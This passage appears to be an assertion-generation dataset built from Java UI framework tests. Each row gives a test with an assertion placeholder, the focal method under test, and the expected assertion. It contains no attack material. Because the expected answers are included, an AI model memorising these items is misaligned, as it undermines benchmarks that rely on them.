applySearchDelegate(IFormField field, SearchFilter search, boolean includeChildren) { String label = field.getLabel(); if (field.getParentField() instanceof ISequenceBox && field.getParentField() instanceof AbstractFormField) { AbstractFormField range = (AbstractFormField) field.getParentField(); if (range.getInitialLabel() != null) { label = range.getInitialLabel() + (StringUtility.isNullOrEmpty(label) ? """" : "" "" + label); } } label = StringUtility.nullIfEmpty(label);  //list box if (field instanceof AbstractListBox<?>) { AbstractListBox<?> valueField = (AbstractListBox<?>) field; if (!valueField.getValue().isEmpty()) { search.addDisplayText(StringUtility.box("""", label, "" "" + TEXTS.get(""LogicIn"") + "" "") + valueField.getDisplayText()); } return; } //tree box if (field instanceof AbstractTreeBox<?>) { AbstractTreeBox<?> valueField = (AbstractTreeBox<?>) field; if (!valueField.getValue().isEmpty()) { search.addDisplayText(StringUtility.box("""", label, "" "" + TEXTS.get(""LogicIn"") + "" "") + valueField.getDisplayText()); } return; } //string, html, label field if (field instanceof AbstractStringField || field instanceof AbstractHtmlField || field instanceof AbstractLabelField) { AbstractValueField<?> valueField = (AbstractValueField<?>) field; if (valueField.getValue() != null) { search.addDisplayText(StringUtility.box("""", label, "" "" + TEXTS.get(""LogicLike"") + "" "") + valueField.getDisplayText()); } return; } //boolean field if (field instanceof AbstractBooleanField) { AbstractBooleanField valueField = (AbstractBooleanField) field; if (valueField.getValue() != null && valueField.getValue() && label != null) { search.addDisplayText(label); } return; } //radiobuttongroup field if (field instanceof AbstractRadioButtonGroup<?>) { AbstractRadioButtonGroup<?> valueField = (AbstractRadioButtonGroup<?>) field; if (valueField.getValue() != null) { IRadioButton<?> selectedButton = valueField.getSelectedButton(); String valueLabel = (selectedButton != null ? selectedButton.getLabel() : null); if (valueLabel == null) { if (label != null) { search.addDisplayText(label); } } else { search.addDisplayText(StringUtility.box("""", label, "" = "") + valueLabel); } } return; } //value field if (field instanceof AbstractValueField<?>) { AbstractValueField<?> valueField = (AbstractValueField<?>) field; if (valueField.getValue() != null) { search.addDisplayText(StringUtility.box("""", label, "" "" + TEXTS.get(""LogicEQ"") + "" "") + valueField.getDisplayText()); } return; }  if (includeChildren) { applySearchDelegateForChildren(field, search); } }"	"assertEquals(LABEL + "" "" + TEXTS.get(""LogicLike"") + "" "" + labelField.getDisplayText(), m_searchFilter.getDisplayTextsPlain())"
"testStringField() { AbstractStringField stringField = new MyStringField(); stringField.init(); runBasicAsserts(stringField); stringField.setValue(""value""); m_searchFilterService.applySearchDelegate(stringField, m_searchFilter, false); Assert.""<AssertPlaceHolder>""; }
applySearchDelegate(IFormField field, SearchFilter search, boolean includeChildren) { String label = field.getLabel(); if (field.getParentField() instanceof ISequenceBox && field.getParentField() instanceof AbstractFormField) { AbstractFormField range = (AbstractFormField) field.getParentField(); if (range.getInitialLabel() != null) { label = range.getInitialLabel() + (StringUtility.isNullOrEmpty(label) ? """" : "" "" + label); } } label = StringUtility.nullIfEmpty(label);  //list box if (field instanceof AbstractListBox<?>) { AbstractListBox<?> valueField = (AbstractListBox<?>) field; if (!valueField.getValue().isEmpty()) { search.addDisplayText(StringUtility.box("""", label, "" "" + TEXTS.get(""LogicIn"") + "" "") + valueField.getDisplayText()); } return; } //tree box if (field instanceof AbstractTreeBox<?>) { AbstractTreeBox<?> valueField = (AbstractTreeBox<?>) field; if (!valueField.getValue().isEmpty()) { search.addDisplayText(StringUtility.box("""", label, "" "" + TEXTS.get(""LogicIn"") + "" "") + valueField.getDisplayText()); } return; } //string, html, label field if (field instanceof AbstractStringField || field instanceof AbstractHtmlField || field instanceof AbstractLabelField) { AbstractValueField<?> valueField = (AbstractValueField<?>) field; if (valueField.getValue() != null) { search.addDisplayText(StringUtility.box("""", label, "" "" + TEXTS.get(""LogicLike"") + "" "") + valueField.getDisplayText()); } return; } //boolean field if (field instanceof AbstractBooleanField) { AbstractBooleanField valueField = (AbstractBooleanField) field; if (valueField.getValue() != null && valueField.getValue() && label != null) { search.addDisplayText(label); } return; } //radiobuttongroup field if (field instanceof AbstractRadioButtonGroup<?>) { AbstractRadioButtonGroup<?> valueField = (AbstractRadioButtonGroup<?>) field; if (valueField.getValue() != null) { IRadioButton<?> selectedButton = valueField.getSelectedButton(); String valueLabel = (selectedButton != null ? selectedButton.getLabel() : null); if (valueLabel == null) { if (label != null) { search.addDisplayText(label); } } else { search.addDisplayText(StringUtility.box("""", label, "" = "") + valueLabel); } } return; } //value field if (field instanceof AbstractValueField<?>) { AbstractValueField<?> valueField = (AbstractValueField<?>) field; if (valueField.getValue() != null) { search.addDisplayText(StringUtility.box("""", label, "" "" + TEXTS.get(""LogicEQ"") + "" "") + valueField.getDisplayText()); } return; }  if (includeChildren) { applySearchDelegateForChildren(field, search); } }"	"assertEquals(LABEL + "" "" + TEXTS.get(""LogicLike"") + "" "" + stringField.getDisplayText(), m_searchFilter.getDisplayTextsPlain())"
"testHtmlField() { AbstractHtmlField htmlField = new MyHTMLField(); htmlField.init(); runBasicAsserts(htmlField); htmlField.setValue(""value""); m_searchFilterService.applySearchDelegate(htmlField, m_searchFilter, false); Assert.""<AssertPlaceHolder>""; }
applySearchDelegate(IFormField field, SearchFilter search, boolean includeChildren) { String label = field.getLabel(); if (field.getParentField() instanceof ISequenceBox && field.getParentField() instanceof AbstractFormField) { AbstractFormField range = (AbstractFormField) field.getParentField(); if (range.getInitialLabel() != null) { label = range.getInitialLabel() + (StringUtility.isNullOrEmpty(label) ? """" : "" "" + label); } } label = StringUtility.nullIfEmpty(label);  //list box if (field instanceof AbstractListBox<?>) { AbstractListBox<?> valueField = (AbstractListBox<?>) field; if (!valueField.getValue().isEmpty()) { search.addDisplayText(StringUtility.box("""", label, "" "" + TEXTS.get(""LogicIn"") + "" "") + valueField.getDisplayText()); } return; } //tree box if (field instanceof AbstractTreeBox<?>) { AbstractTreeBox<?> valueField = (AbstractTreeBox<?>) field; if (!valueField.getValue().isEmpty()) { search.addDisplayText(StringUtility.box("""", label, "" "" + TEXTS.get(""LogicIn"") + "" "") + valueField.getDisplayText()); } return; } //string, html, label field if (field instanceof AbstractStringField || field instanceof AbstractHtmlField || field instanceof AbstractLabelField) { AbstractValueField<?> valueField = (AbstractValueField<?>) field; if (valueField.getValue() != null) { search.addDisplayText(StringUtility.box("""", label, "" "" + TEXTS.get(""LogicLike"") + "" "") + valueField.getDisplayText()); } return; } //boolean field if (field instanceof AbstractBooleanField) { AbstractBooleanField valueField = (AbstractBooleanField) field; if (valueField.getValue() != null && valueField.getValue() && label != null) { search.addDisplayText(label); } return; } //radiobuttongroup field if (field instanceof AbstractRadioButtonGroup<?>) { AbstractRadioButtonGroup<?> valueField = (AbstractRadioButtonGroup<?>) field; if (valueField.getValue() != null) { IRadioButton<?> selectedButton = valueField.getSelectedButton(); String valueLabel = (selectedButton != null ? selectedButton.getLabel() : null); if (valueLabel == null) { if (label != null) { search.addDisplayText(label); } } else { search.addDisplayText(StringUtility.box("""", label, "" = "") + valueLabel); } } return; } //value field if (field instanceof AbstractValueField<?>) { AbstractValueField<?> valueField = (AbstractValueField<?>) field; if (valueField.getValue() != null) { search.addDisplayText(StringUtility.box("""", label, "" "" + TEXTS.get(""LogicEQ"") + "" "") + valueField.getDisplayText()); } return; }  if (includeChildren) { applySearchDelegateForChildren(field, search); } }"	"assertEquals(LABEL + "" "" + TEXTS.get(""LogicLike"") + "" "" + htmlField.getDisplayText(), m_searchFilter.getDisplayTextsPlain())"
"testAddCssClassStylable() { IStyleable stylable = new Cell(); stylable.setCssClass(INITIAL_CLASSES); stylable.addCssClass(ADDED_CLASS); Assert.""<AssertPlaceHolder>""; }
getCssClass();  void setCssClass(String cssClass);  /** * @param cssClass *          one or more CSS classes separated by space */ default void addCssClass(String cssClass) { setCssClass(BEANS.get(StyleHelper.class).addCssClass(getCssClass(), cssClass)); }"	"assertEquals(INITIAL_CLASSES + "" "" + ADDED_CLASS, stylable.getCssClass())"
"testRemoveCssClassStylable() { IStyleable stylable = new Cell(); stylable.setCssClass(INITIAL_CLASSES); stylable.removeCssClass(CLASS); Assert.""<AssertPlaceHolder>""; }
getCssClass();  void setCssClass(String cssClass);  /** * @param cssClass *          one or more CSS classes separated by space */ default void addCssClass(String cssClass) { setCssClass(BEANS.get(StyleHelper.class).addCssClass(getCssClass(), cssClass)); }"	"assertEquals(INITIAL_FIRST_CLASS + "" "" + INITIAL_LAST_CLASS, stylable.getCssClass())"
"testCleanupWithEmptyList() { //noinspection deprecation List<IMenu> cleanList = ActionUtility.visibleNormalizedActions(Collections.emptyList()); ""<AssertPlaceHolder>""; }
visibleNormalizedActions(List<T> actionNodes) { return normalizedActions(actionNodes, createVisibleFilter()); }"	assertTrue(cleanList.isEmpty())
"testGetMenuByClassNullMenuType() { TestContextMenu contextMenu = new TestContextMenu(mock(IWidget.class), Collections.emptyList()); when(m_contextMenuOwner.getContextMenu()).thenReturn(contextMenu); ""<AssertPlaceHolder>""; }
getMenuByClass(IContextMenuOwner contextMenuOwner, final Class<T> menuType) { if (contextMenuOwner == null) { throw new IllegalArgumentException(""Argument 'contextMenuOwner' must not be null""); }  List<IMenu> rootMenus; IContextMenu root = contextMenuOwner.getContextMenu(); if (root == null) { // some components have no root menu but directly contain child menus (e.g. Desktop) rootMenus = contextMenuOwner.getMenus(); } else { rootMenus = Collections.singletonList(root); } return new ActionFinder().findAction(rootMenus, menuType); }"	assertNull(MenuUtility.getMenuByClass(m_contextMenuOwner, null))
"testGetMenuByClassOwnerHasNoContextMenu() { when(m_contextMenuOwner.getContextMenu()).thenReturn(null); ""<AssertPlaceHolder>""; }
getMenuByClass(IContextMenuOwner contextMenuOwner, final Class<T> menuType) { if (contextMenuOwner == null) { throw new IllegalArgumentException(""Argument 'contextMenuOwner' must not be null""); }  List<IMenu> rootMenus; IContextMenu root = contextMenuOwner.getContextMenu(); if (root == null) { // some components have no root menu but directly contain child menus (e.g. Desktop) rootMenus = contextMenuOwner.getMenus(); } else { rootMenus = Collections.singletonList(root); } return new ActionFinder().findAction(rootMenus, menuType); }"	assertNull(MenuUtility.getMenuByClass(m_contextMenuOwner, TestMenu.class))
"testGetMenuByClassMenuDoesNotExist() { TestContextMenu contextMenu = new TestContextMenu(mock(IWidget.class), Collections.emptyList()); when(m_contextMenuOwner.getContextMenu()).thenReturn(contextMenu); ""<AssertPlaceHolder>""; }
getMenuByClass(IContextMenuOwner contextMenuOwner, final Class<T> menuType) { if (contextMenuOwner == null) { throw new IllegalArgumentException(""Argument 'contextMenuOwner' must not be null""); }  List<IMenu> rootMenus; IContextMenu root = contextMenuOwner.getContextMenu(); if (root == null) { // some components have no root menu but directly contain child menus (e.g. Desktop) rootMenus = contextMenuOwner.getMenus(); } else { rootMenus = Collections.singletonList(root); } return new ActionFinder().findAction(rootMenus, menuType); }"	assertNull(MenuUtility.getMenuByClass(m_contextMenuOwner, TestMenu.class))
"testGetMenuByClassMenuExists() { TestMenu menu = new TestMenu(); TestContextMenu contextMenu = new TestContextMenu(mock(IWidget.class), Collections.singletonList(menu)); when(m_contextMenuOwner.getContextMenu()).thenReturn(contextMenu); ""<AssertPlaceHolder>""; }
getMenuByClass(IContextMenuOwner contextMenuOwner, final Class<T> menuType) { if (contextMenuOwner == null) { throw new IllegalArgumentException(""Argument 'contextMenuOwner' must not be null""); }  List<IMenu> rootMenus; IContextMenu root = contextMenuOwner.getContextMenu(); if (root == null) { // some components have no root menu but directly contain child menus (e.g. Desktop) rootMenus = contextMenuOwner.getMenus(); } else { rootMenus = Collections.singletonList(root); } return new ActionFinder().findAction(rootMenus, menuType); }"	assertSame(menu, MenuUtility.getMenuByClass(m_contextMenuOwner, TestMenu.class))
"testCleanupWithEmptyList() { List<IMenu> cleanList = MenuUtility.visibleNormalizedMenus(Collections.emptyList()); ""<AssertPlaceHolder>""; }
visibleNormalizedMenus(List<IMenu> menus) { return normalizedMenus(menus, createVisibleFilter()); }"	assertTrue(cleanList.isEmpty())
"testSetText() { Cell c = new Cell(); ICellObserver observer = installMockObserver(c); String text = ""text""; c.setText(text); ""<AssertPlaceHolder>""; verify(observer).cellChanged(c, ICell.TEXT_BIT); }
getText() { return m_text; }"	assertEquals(text, c.getText())
"testSetIconId() { Cell c = new Cell(); ICellObserver observer = installMockObserver(c); String iconId = ""iconId""; c.setIconId(iconId); ""<AssertPlaceHolder>""; verify(observer).cellChanged(c, ICell.ICON_ID_BIT); }
getIconId() { return m_cellSpecialization.getIconId(); }"	assertEquals(iconId, c.getIconId())
"testSetTooltipText_notNull() { Cell c = new Cell(); ICellObserver observer = installMockObserver(c); String tooltip = ""tooltip""; c.setTooltipText(tooltip); ""<AssertPlaceHolder>""; verify(observer).cellChanged(c, ICell.TOOLTIP_BIT); }
getTooltipText() { return m_cellSpecialization.getTooltipText(); }"	assertEquals(tooltip, c.getTooltipText())
"testSetCssClass_notNull() { Cell c = new Cell(); ICellObserver observer = installMockObserver(c); String cssClass = ""cssClass""; c.setCssClass(cssClass); ""<AssertPlaceHolder>""; verify(observer).cellChanged(c, ICell.CSS_CLASS_BIT); }
getCssClass() { return m_cellSpecialization.getCssClass(); }"	assertEquals(cssClass, c.getCssClass())
"testSetTooltipText_null() { Cell c = new Cell(); ICellObserver observer = installMockObserver(c); c.setTooltipText(null); ""<AssertPlaceHolder>""; verifyNoInteractions(observer); }
getTooltipText() { return m_cellSpecialization.getTooltipText(); }"	assertNull(c.getTooltipText())
"testSetHorizontalAlignment() { Cell c = new Cell(); ICellObserver observer = installMockObserver(c); int hAlignment = 100; c.setHorizontalAlignment(hAlignment); ""<AssertPlaceHolder>""; verify(observer).cellChanged(c, ICell.H_ALIGN_BIT); }
getHorizontalAlignment() { return m_cellSpecialization.getHorizontalAlignment(); }"	assertEquals(hAlignment, c.getHorizontalAlignment())
"testSetBackgroundColor() { Cell c = new Cell(); ICellObserver observer = installMockObserver(c); String bgColor = ""eeeeee""; c.setBackgroundColor(bgColor); ""<AssertPlaceHolder>""; verify(observer).cellChanged(c, ICell.BG_COLOR_BIT); }
getBackgroundColor() { return m_cellSpecialization.getBackgroundColor(); }"	assertEquals(bgColor, c.getBackgroundColor())
"testSetForegroundColor() { Cell c = new Cell(); ICellObserver observer = installMockObserver(c); String fgColor = ""ff0000""; c.setForegroundColor(fgColor); ""<AssertPlaceHolder>""; verify(observer).cellChanged(c, ICell.FG_COLOR_BIT); }
getForegroundColor() { return m_cellSpecialization.getForegroundColor(); }"	assertEquals(fgColor, c.getForegroundColor())
"testSetFont() { Cell c = new Cell(); ICellObserver observer = installMockObserver(c); FontSpec font = FontSpec.parse(""Arial-bold-italic-13""); c.setFont(font); ""<AssertPlaceHolder>""; verify(observer).cellChanged(c, ICell.FONT_BIT); }
getFont() { return m_cellSpecialization.getFont(); }"	assertEquals(font.toPattern(), c.getFont().toPattern())
"testSetHtmlEnabled() { Cell c = new Cell(); ICellObserver observer = installMockObserver(c); c.setHtmlEnabled(true); ""<AssertPlaceHolder>""; verify(observer).cellChanged(c, ICell.HTML_ENABLED_BIT); }
isHtmlEnabled() { return m_cellSpecialization.isHtmlEnabled(); }"	assertTrue(c.isHtmlEnabled())
"testSetMandatory() { Cell c = new Cell(); ICellObserver observer = installMockObserver(c); c.setMandatory(true); ""<AssertPlaceHolder>""; verify(observer).cellChanged(c, ICell.MANDATORY_BIT); }
isMandatory() { return m_cellSpecialization.isMandatory(); }"	assertTrue(c.isMandatory())
"testSetObserver() { Cell c = new Cell(); ICellObserver observer = Mockito.mock(ICellObserver.class); c.setObserver(observer); ""<AssertPlaceHolder>""; verifyNoInteractions(observer); }
getObserver() { return m_observer; }"	assertSame(observer, c.getObserver())
"testInitialErrorStatus() { Cell c = new Cell(); ""<AssertPlaceHolder>""; }
getErrorStatus() { return m_errorStatus; }"	assertNull(c.getErrorStatus())
"testSetErrorStatus() { Cell c = new Cell(); c.addErrorStatus(new Status(""error"", IStatus.ERROR)); ""<AssertPlaceHolder>""; }
getErrorStatus() { return m_errorStatus; }"	assertEquals(IStatus.ERROR, c.getErrorStatus().getSeverity())
"testClearErrorStatus() { Cell c = new Cell(); c.addErrorStatus(new Status(""error"", IStatus.ERROR)); c.clearErrorStatus(); ""<AssertPlaceHolder>""; }
getErrorStatus() { return m_errorStatus; }"	assertNull(c.getErrorStatus())
"testAddRemoveMultistatus() { Cell c = new Cell(); ParsingFailedStatus errorStatus = new ParsingFailedStatus(""failed"", ""rawString""); MultiStatus ms = new MultiStatus(); ms.add(errorStatus); c.addErrorStatuses(ms.getChildren()); c.removeErrorStatus(ParsingFailedStatus.class); ""<AssertPlaceHolder>""; }
getErrorStatus() { return m_errorStatus; }"	assertNull(c.getErrorStatus())
"testBuildBean_InvisibleColumns() { TableCompactHandler handler = new TableCompactHandler(m_table); handler.withMaxContentLines(2) .withUseOnlyVisibleColumns(false); CompactBean bean = handler.buildBean(m_table.getRow(0));  ""<AssertPlaceHolder>""; }
buildBean(ITableRow row) { return buildBean(getColumns(), row); }"	"assertTrue(bean.getTitle().contains(""invisible""))"
"testToString() { final TableEvent e = new TableEvent(mock(ITable.class), TableEvent.TYPE_ALL_ROWS_DELETED); ""<AssertPlaceHolder>""; }
toString() { StringBuilder buf = new StringBuilder(); buf.append(getClass().getSimpleName()).append(""[""); buf.append(getTypeName()); // rows if (CollectionUtility.hasElements(m_rows) && getTable() != null) { buf.append("" ""); if (m_rows.size() == 1) { buf.append(""row "").append(m_rows.get(0)); } else { buf.append(""rows {""); Iterator<? extends ITableRow> rowIt = m_rows.iterator(); buf.append("""").append(rowIt.next()); while (rowIt.hasNext()) { buf.append("",""); buf.append("""").append(rowIt.next()); } buf.append(""}""); } } buf.append(""]""); return buf.toString(); }"	"assertTrue(e.toString().contains(""TYPE_ALL_ROWS_DELETED""))"
"testValidate_MandatoryChange() { TestVetoTable table = new TestVetoTable(); table.addRowsByArray(new String[]{"""", """"}); table.addRowsByArray(new String[]{"""", """"}); table.getValidateTestColumn().setMandatory(true); ICell c0 = table.getCell(0, 0); ""<AssertPlaceHolder>""; }
setMandatory(boolean mandatory) { boolean changed = propertySupport.setPropertyBool(IFormField.PROP_MANDATORY, mandatory); if (changed && isInitialized()) { reinitCells(); } }"	assertFalse(c0.isContentValid())
"testValidColumn_EditField() { TestVetoTable table = new TestVetoTable(); table.addRowsByArray(new String[]{VALID, ""a""}); TestVetoTable.ValidateTestColumn testColumn = table.getValidateTestColumn(); testColumn.setMandatory(true); IValueField field = (IValueField) testColumn.prepareEdit(table.getRow(0)); ""<AssertPlaceHolder>""; }
prepareEdit(ITableRow row) { ITable table = getTable(); if (table == null || !this.isCellEditable(row)) { return null; } IFormField f = interceptPrepareEdit(row); if (f != null) { f.setLabelVisible(false); GridData gd = f.getGridDataHints(); gd.weightY = 1; f.setGridDataHints(gd); } return f; }"	assertEquals(VALID, field.getValue())
"testUpdateDisplayText() { final TestDecorationTable table = new TestDecorationTable(); ITableRow row = table.addRow(); table.getC1Column().setValue(row, ""newValue""); ""<AssertPlaceHolder>""; }
getDisplayText(ITableRow r) { return r.getCell(getColumnIndex()).getText(); }"	"assertEquals(""newValue"", table.getC1Column().getDisplayText(table.getRow(0)))"
"testHasTimeChange() { Date testDate = new Date(); TestTable table = new TestTable(); TestDateColumn col = table.getTestDateColumn(); col.setFormat(null); table.addRowsByArray(new Object[]{testDate}); String dateOnlyText = table.getCell(0, 0).getText(); col.setHasTime(true); String dateTimeText = table.getCell(0, 0).getText(); ""<AssertPlaceHolder>""; }
setHasTime(boolean b) { m_hasTime = b; refreshValues(); }"	assertTrue(dateTimeText.length() > dateOnlyText.length())
"testHasTime_EditableChange() { Date testDate = new Date(); TestTable table = new TestTable(); TestDateColumn col = table.getTestDateColumn(); col.setFormat(null); col.setEditable(true); table.addRowsByArray(new Object[]{testDate}); String dateOnlyText = table.getCell(0, 0).getText(); col.setHasTime(true); String dateTimeText = table.getCell(0, 0).getText(); ""<AssertPlaceHolder>""; }
setHasTime(boolean b) { m_hasTime = b; refreshValues(); }"	assertTrue(dateTimeText.length() > dateOnlyText.length())
"testHasDate() { Date testDate = new Date(); TestTable table = new TestTable(); TestDateColumn col = table.getTestDateColumn(); col.setFormat(null); col.setHasDate(false); col.setHasTime(true); table.addRowsByArray(new Object[]{testDate}); String timeOnlyText = table.getCell(0, 0).getText(); col.setHasDate(true); String dateTimeText = table.getCell(0, 0).getText(); ""<AssertPlaceHolder>""; }
setHasDate(boolean b) { m_hasDate = b; refreshValues(); }"	assertTrue(dateTimeText.length() > timeOnlyText.length())
"testUpdateFormat() { TestTable table = new TestTable(); table.addRow(table.createRow()); table.getTestNumberColumn().setValue(0, BigDecimal.TEN); DecimalFormat format = table.getTestNumberColumn().getFormat(); format.setMinimumFractionDigits(3); table.getTestNumberColumn().setFormat(format); ""<AssertPlaceHolder>""; }
setFormat(DecimalFormat format) { Assertions.assertNotNull(format); DecimalFormat newFormat = (DecimalFormat) format.clone(); newFormat.setParseBigDecimal(true); propertySupport.setProperty(INumberValueContainer.PROP_DECIMAL_FORMAT, newFormat); updateDisplayTexts(); }"	"assertEquals(""10.000"", table.getCell(0, 0).getText())"
"testLookupRowWithUntrimmedText1() { final AbstractProposalColumn<Long> column = new AbstractProposalColumn<Long>() { @Override protected boolean getConfiguredEditable() { return true; }  @Override protected boolean getConfiguredTrimText() { return false; } }; column.setCodeTypeClass(TestCodeType.class); final ITable table = new AbstractTable() { @Override protected void injectColumnsInternal(OrderedCollection<IColumn<?>> columns) { columns.addFirst(column); } }; ITableRow row = table.addRow();  @SuppressWarnings(""unchecked"") IProposalField<Long> field = (IProposalField<Long>) column.prepareEditInternal(row); field.getUIFacade().setValueAsStringFromUI("" a ""); column.completeEdit(row, field); ""<AssertPlaceHolder>""; }
prepareEditInternal(final ITableRow row) { ProposalField2Editor f = (ProposalField2Editor) getDefaultEditor(); f.setRow(row); mapEditorFieldProperties(f); return f; }"	"assertEquals("" a "", column.getValue(row))"
"testLookupRowWithUntrimmedText2() { final AbstractProposalColumn<Long> column = new AbstractProposalColumn<Long>() { @Override protected boolean getConfiguredEditable() { return true; }  @Override protected boolean getConfiguredTrimText() { return true; } }; column.setCodeTypeClass(TestCodeType.class); final ITable table = new AbstractTable() { @Override protected void injectColumnsInternal(OrderedCollection<IColumn<?>> columns) { columns.addFirst(column); } }; ITableRow row = table.addRow();  @SuppressWarnings(""unchecked"") IProposalField<Long> field = (IProposalField<Long>) column.prepareEditInternal(row); field.getUIFacade().setValueAsStringFromUI("" a ""); column.completeEdit(row, field); ""<AssertPlaceHolder>""; }
prepareEditInternal(final ITableRow row) { ProposalField2Editor f = (ProposalField2Editor) getDefaultEditor(); f.setRow(row); mapEditorFieldProperties(f); return f; }"	"assertEquals(""a"", column.getValue(row))"
"testLookupRowWithTooLongText1() { final AbstractProposalColumn<Long> column = new AbstractProposalColumn<Long>() { @Override protected boolean getConfiguredEditable() { return true; }  @Override protected int getConfiguredMaxLength() { return 32; } }; column.setCodeTypeClass(TestCodeType.class); final ITable table = new AbstractTable() { @Override protected void injectColumnsInternal(OrderedCollection<IColumn<?>> columns) { columns.addFirst(column); } }; ITableRow row = table.addRow();  @SuppressWarnings(""unchecked"") IProposalField<Long> field = (IProposalField<Long>) column.prepareEditInternal(row); field.getUIFacade().setValueAsStringFromUI(""1234567890""); column.completeEdit(row, field); ""<AssertPlaceHolder>""; }
prepareEditInternal(final ITableRow row) { ProposalField2Editor f = (ProposalField2Editor) getDefaultEditor(); f.setRow(row); mapEditorFieldProperties(f); return f; }"	"assertEquals(""1234567890"", column.getValue(row))"
"testLookupRowWithTooLongText2() { final AbstractProposalColumn<Long> column = new AbstractProposalColumn<Long>() { @Override protected boolean getConfiguredEditable() { return true; }  @Override protected int getConfiguredMaxLength() { return 8; } }; column.setCodeTypeClass(TestCodeType.class); final ITable table = new AbstractTable() { @Override protected void injectColumnsInternal(OrderedCollection<IColumn<?>> columns) { columns.addFirst(column); } }; ITableRow row = table.addRow();  @SuppressWarnings(""unchecked"") IProposalField<Long> field = (IProposalField<Long>) column.prepareEditInternal(row); field.getUIFacade().setValueAsStringFromUI(""1234567890""); column.completeEdit(row, field); ""<AssertPlaceHolder>""; }
prepareEditInternal(final ITableRow row) { ProposalField2Editor f = (ProposalField2Editor) getDefaultEditor(); f.setRow(row); mapEditorFieldProperties(f); return f; }"	"assertEquals(""12345678"", column.getValue(row))"
"testMaxLengthValidation() { TestTable table = new TestTable(); TestStringColumn col = table.getTestStringColumn(); col.setMaxLength(1); table.addRowByArray(new Object[]{""text""}); ""<AssertPlaceHolder>""; }
setMaxLength(int len) { if (len > 0) { propertySupport.setPropertyInt(IStringField.PROP_MAX_LENGTH, len); } refreshValues(); }"	"assertEquals(""t"", table.getCell(0, 0).getValue())"
"testModifyHandler() { ShowInvisibleColumnsForm form = getForm(); form.startModify();  ColumnsTableField tableField = form.getColumnsTableField(); Table table = tableField.getTable(); List<IColumn<?>> columns = table.getKeyColumn().getValues(); ""<AssertPlaceHolder>"";  form.touch(); form.doClose(); }
getKeyColumn() { return getColumnSet().getColumnByClass(KeyColumn.class); }"	assertEquals(Arrays.asList(m_column3, m_column1), columns)
"testInitConfig_DefaultValues() { m_tree.initConfig(); ""<AssertPlaceHolder>""; }
initConfig() { super.initConfig(); m_eventHistory = createEventHistory(); m_eventBuffer = createEventBuffer(); m_uiFacade = BEANS.get(ModelContextProxy.class).newProxy(createUIFacade(), ModelContext.copyCurrent()); m_contributionHolder = new ContributionComposite(this); setTitle(getConfiguredTitle()); setIconId(getConfiguredIconId()); setDefaultIconId(getConfiguredDefaultIconId()); setCssClass(getConfiguredCssClass()); setAutoTitle(getConfiguredAutoTitle()); setCheckable(getConfiguredCheckable()); setCheckableStyle(getConfiguredCheckableStyle()); setTextFilterEnabled(getConfiguredTextFilterEnabled()); setNodeHeightHint(getConfiguredNodeHeightHint()); setMultiCheck(getConfiguredMultiCheck()); setMultiSelect(getConfiguredMultiSelect()); setAutoDiscardOnDelete(getConfiguredAutoDiscardOnDelete()); setDragEnabled(getConfiguredDragEnabled()); setDragType(getConfiguredDragType()); setDropType(getConfiguredDropType()); setDropMaximumSize(getConfiguredDropMaximumSize()); setRootNodeVisible(getConfiguredRootNodeVisible()); setRootHandlesVisible(getConfiguredRootHandlesVisible()); setScrollToSelection(getConfiguredScrollToSelection()); setSaveAndRestoreScrollbars(getConfiguredSaveAndRestoreScrollbars()); setAutoCheckChildNodes(getConfiguredAutoCheckChildNodes()); setLazyExpandingEnabled(getConfiguredLazyExpandingEnabled()); setDisplayStyle(getConfiguredDisplayStyle()); setToggleBreadcrumbStyleEnabled(getConfiguredToggleBreadcrumbStyleEnabled()); setRootNode(new AbstractTreeNode() { }); // add Convenience observer for drag & drop callbacks and event history addTreeListener( e -> { //event history IEventHistory<TreeEvent> h = getEventHistory(); if (h != null) { h.notifyEvent(e); } //dnd switch (e.getType()) { case TreeEvent.TYPE_NODES_DRAG_REQUEST: { m_lastSeenDropNode = null; if (e.getDragObject() == null) { try { TransferObject transferObject = interceptDrag(e.getNode()); if (transferObject == null) { transferObject = interceptDrag(e.getNodes()); } e.setDragObject(transferObject); } catch (Exception t) { LOG.error(""Drag"", t); } } break; } case TreeEvent.TYPE_NODE_DROP_ACTION: { m_lastSeenDropNode = null; if (e.getDropObject() != null) { try { interceptDrop(e.getNode(), e.getDropObject()); } catch (Exception t) { LOG.error(""Drop"", t); } } break; } case TreeEvent.TYPE_NODES_SELECTED: { rebuildKeyStrokesInternal(); break; } case TreeEvent.TYPE_NODES_CHECKED: { try { interceptNodesChecked(CollectionUtility.arrayList(e.getNodes())); } catch (RuntimeException ex) { BEANS.get(ExceptionHandler.class).handle(ex); } break; } case TreeEvent.TYPE_NODE_DROP_TARGET_CHANGED: { try { if (m_lastSeenDropNode == null || m_lastSeenDropNode != e.getNode()) { m_lastSeenDropNode = e.getNode(); interceptDropTargetChanged(e.getNode()); } } catch (RuntimeException ex) { LOG.error(""DropTargetChanged"", ex); } break; } case TreeEvent.TYPE_DRAG_FINISHED: { m_lastSeenDropNode = null; } } }, TreeEvent.TYPE_NODES_DRAG_REQUEST, TreeEvent.TYPE_NODE_DROP_ACTION, TreeEvent.TYPE_NODES_SELECTED, TreeEvent.TYPE_NODES_CHECKED, TreeEvent.TYPE_NODE_DROP_TARGET_CHANGED, TreeEvent.TYPE_DRAG_FINISHED); // key shortcuts List<Class<? extends IKeyStroke>> configuredKeyStrokes = getConfiguredKeyStrokes(); List<IKeyStroke> ksList = new ArrayList<>(configuredKeyStrokes.size()); for (Class<? extends IKeyStroke> keystrokeClazz : configuredKeyStrokes) { ksList.add(ConfigurationUtility.newInnerInstance(this, keystrokeClazz)); } //ticket 87370: add ENTER key stroke when execNodeAction has an override if (ConfigurationUtility.isMethodOverwrite(AbstractTree.class, ""execNodeAction"", new Class[]{ITreeNode.class}, this.getClass())) { ksList.add(new KeyStroke(""ENTER"") { @Override protected void execAction() { fireNodeAction(getSelectedNode()); } }); }  List<IKeyStroke> contributedKeyStrokes = m_contributionHolder.getContributionsByClass(IKeyStroke.class); ksList.addAll(contributedKeyStrokes);  m_baseKeyStrokes = ksList; setKeyStrokesInternal(m_baseKeyStrokes);  // menus List<Class<? extends IMenu>> declaredMenus = getDeclaredMenus(); List<IMenu> contributedMenus = m_contributionHolder.getContributionsByClass(IMenu.class);  OrderedCollection<IMenu> menus = new OrderedCollection<>(); for (Class<? extends IMenu> menuClazz : declaredMenus) { IMenu menu = ConfigurationUtility.newInnerInstance(this, menuClazz); menus.addOrdered(menu); } try { injectMenusInternal(menus); } catch (Exception e) { LOG.error(""Error occurred while dynamically contributing menus."", e); }  menus.addAllOrdered(contributedMenus); new MoveActionNodesHandler<>(menus).moveModelObjects(); TreeContextMenu contextMenu = new TreeContextMenu(this, 